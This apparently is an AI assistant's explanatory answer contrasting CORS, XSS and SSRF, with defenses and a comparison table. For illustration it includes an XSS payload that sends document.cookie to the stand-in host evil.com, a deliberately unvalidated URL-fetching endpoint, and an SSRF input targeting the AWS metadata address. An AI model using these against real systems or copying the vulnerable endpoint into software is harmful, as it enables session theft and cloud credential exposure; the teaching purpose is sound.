Great question — **CORS**, **XSS**, and **SSRF** are all security-related concepts in web applications, but they solve or exploit **different problems** in the system. Here's a clear, side-by-side explanation:

---

## 🔄 1. **CORS (Cross-Origin Resource Sharing)**

### ❓ What is it?

A **browser security feature** that controls how web pages from one origin (domain) can **make requests to a different origin**.

### 📌 Purpose:

Prevent **malicious websites** from calling **your APIs** via JavaScript unless you've allowed them.

### ✅ Example:

A frontend app on `https://example.com` tries to fetch from an API at `https://api.example.org`.

If `api.example.org` does **not** allow `example.com` via CORS headers, the **browser blocks the request**.

```http
Access-Control-Allow-Origin: https://example.com
```

### 🛡️ Protection Against:

* **Untrusted cross-origin requests from browsers**
* Enforced **only by browsers**, not by servers or tools like `curl`

---

## 🧨 2. **XSS (Cross-Site Scripting)**

### ❓ What is it?

An attack where malicious JavaScript is **injected into a trusted web page** — often via user input that is displayed **without proper escaping or sanitization**.

### 🧪 Goal:

Run JavaScript in another user’s browser, **stealing cookies, tokens**, or hijacking sessions.

### 🔥 Example:

```html
<script>fetch('https://evil.com?cookie=' + document.cookie)</script>
```

If your app renders user comments like this without escaping, you’re vulnerable.

### 🛡️ Protection:

* **Escape/sanitize all user input**
* Use **Content Security Policy (CSP)**
* Don't trust input in HTML, JS, or attributes

---

## 🌐 3. **SSRF (Server-Side Request Forgery)**

### ❓ What is it?

An attacker tricks the **server** into making a **backend HTTP request** to an internal service or resource.

### 🧪 Goal:

Access internal services (like metadata endpoints, private APIs), escalate privileges, or pivot within the network.

### 🔥 Example:

An app accepts a URL to fetch a preview image:

```python
@app.get("/preview")
def preview(url: str):
    return requests.get(url).content
```

Attacker passes:

```
/preview?url=http://169.254.169.254/latest/meta-data/  # AWS EC2 metadata
```

### 🛡️ Protection:

* Validate and whitelist outgoing URLs
* Don’t fetch arbitrary URLs on behalf of users
* Use network-level controls (firewalls, proxy rules)

| Feature                  | CORS                              | XSS                             | SSRF                              |
| ------------------------ | --------------------------------- | ------------------------------- | --------------------------------- |
| 🔍 **Type**              | Browser policy                    | Injection attack                | Server-side abuse                 |
| 🎯 **Target**            | Protects **frontend** APIs        | Attacks **end user browsers**   | Attacks **your server**           |
| 🧭 **Direction**         | Browser → API                     | User → Web App                  | Web App → Internal Systems        |
| 🛡️ **Defense**          | CORS headers (`Access-Control-*`) | Escape/sanitize output, CSP     | Whitelist URLs, deny internal IPs |
| ❌ **What it doesn’t do** | Doesn’t stop malicious JS         | Doesn’t block internal requests | Doesn’t involve browsers directly |

---

## 🔐 TL;DR:

* **CORS**: Prevents **other origins** from making **unauthorized requests** to your API via the browser.
* **XSS**: Prevents **JavaScript injection** into your website that targets your **users**.
* **SSRF**: Prevents your **server** from being used to call **internal resources** (often behind firewalls).
